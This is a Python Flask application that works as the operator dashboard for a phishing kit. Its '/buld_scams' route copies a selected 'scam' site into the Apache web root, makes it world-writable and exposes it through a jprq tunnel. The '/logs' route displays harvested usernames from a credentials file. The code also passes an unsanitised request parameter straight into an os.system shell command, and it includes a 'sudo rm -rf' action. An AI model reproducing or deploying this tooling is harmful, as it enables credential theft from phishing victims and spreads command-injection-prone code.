from flask import send_file,make_response,redirect,flash,session
from flask import Flask,request,render_template,render_template_string,send_file
import os
import flask
import threading

app = Flask(__name__)

def ngrok():
    os.system("xterm -hold -e  jprq tcp 80")

@app.route("/")
def dashboard():
    
    return render_template('dashboard.html')
@app.route("/server")
def apache():
    
    statuse = request.args.get('statuse')
    try:
        
        print(statuse)
        if statuse == 'start':
            print("x")
            os.system("sudo service apache2 start")
        if statuse == 'stop':
            os.system("sudo service apache2 stop") 
        if statuse == 'clear':
            os.system("sudo rm -rf /var/www/html/")
    except Exception:
        pass    

    return redirect("/")
@app.route("/scams")
def scams():
    
    return render_template('scams.html') 
@app.route("/buld_scams")
def build_scams():
    try:
        scam_name = request.args.get('scam_name')
        os.system("cp -a static/sites/"+scam_name+"/. /var/www/html/")
        os.system("chmod 777 /var/www/html/")
        os.system("chmod 777 /var/www/html/*")
        threading.Thread(target=ngrok).start()
    except Exception:
        pass    
    return redirect("/logs")
@app.route("/logs")  
def logsx():
    result = os.popen("cat /var/www/html/usernames.txt").read()
    return render_template('logs.html',result=result)
if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0', port=5000,threaded=True) 